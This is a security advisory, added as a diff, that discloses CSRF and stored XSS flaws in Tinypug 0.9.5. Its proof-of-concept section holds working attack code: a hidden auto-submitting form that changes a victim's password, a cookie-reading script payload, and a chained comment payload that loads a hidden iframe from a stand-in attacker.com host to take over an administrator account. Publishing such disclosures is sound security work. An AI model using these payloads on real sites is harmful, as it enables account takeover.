@@ -1,0 +1,94 @@
+##########################www.BugReport.ir########################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title:		Tinypug Multiple Vulnerabilities
+# Vendor:		http://platformassociates.com/
+#               (project hosted at http://code.google.com/p/tinypug/)
+# Vulnerable Version:	0.9.5 (and prior versions)
+# Exploitation:		Remote with browser
+# Fix:			N/A
+###################################################################################
+
+####################
+- Description:
+####################
+
+Tinypug is a system for building portals that enable innovation communities and customer inquiry.
+The idea is to go beyond one-off statistical surveys (which tend to only verify an existing paradigm)
+to foster real collaboration, scalable two-way communication, and anecdotal feedback from users/customers. 
+
+
+####################
+- Vulnerability:
+####################
+
++--> CSRF (Cross-Site Request Forgery)
+	The password changing page is vulnerable to CSRF attack. This vulnerability
+	can be used to change the password of the victim. For details of this
+	process see "Exploits/PoCs" section.
+
++--> Stored XSS Vulnerability
+	The comment page is vulnerable to Stored XSS attack. But comments will be published
+	only after administrator confirmation. However this XSS vulnerablity can be
+	used in conjunction with the more serious security whole (CSRF) in order to change
+	administrator's password.
+
+####################
+- Exploits/PoCs:
+####################
+
++--> Exploiting The CSRF Vulnerability:
+	As any CSRF attack, you need victim to be logged in at target site, namely "victim.com",
+	and visits the attacker's site, namely "attacker.com".
+	Then attacker can change password of the victim (for example to "the-new-password")
+	by presenting following code at attacker.com site:
+	<div>
+		<iframe id="if1" name="if1" style="display:none">
+			This frame is invisible!!
+		</iframe>
+		<form action="http://victim.com/tinypug-0.9.5/profiles/change_password"
+				method="post" id="the_form" style="display:none" target="if1">	
+			<input type="password" name="password" value="the-new-password"  />
+			<input type="password" name="password2" value="the-new-password"  />
+			<input type="submit" value="Change Password"  />
+		</form>
+		<script type="text/javascript">
+		//<![CDATA[
+			var $form = document.getElementById ('the_form');
+			$form.submit ();
+		//]]>
+		</script>
+	</div>
+
++--> Exploiting The Stored XSS Vulnerability:
+	Simply go to the comment page of a post
+	(for example at "http://victim.com/tinypug-0.9.5/stories/view/welcome#comments")
+	and embed any desired XSS vector like <script>alert(document.cookie)</script>
+	But be aware that comments will be reviewed by administrators before publishing.
+
++--> Changing Administrator Password by combining above Vulnerabilities:
+	Using the Stored XSS attack, make administrator to see following code:
+	
+	My comment !!! <iframe id="f2" name="f2" src="http://attacker.com/csrf.php" style="display:none" />
+	
+	Then whether he/she approve your comment or not :) his/her password will be changed
+	to "the-new-password" via CSRF attack by visiting implicitly
+	the "http://attacker.com/csrf.php" URI.
+
+####################
+- Solution:
+####################
+
+For CSRF vulnerability password changing page must be changed in order to ask for the old password, too.
+
+For XSS vulnerability you could include all of the comments in the approval page by <xmp> tag.
+
+
+####################
+- Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.com
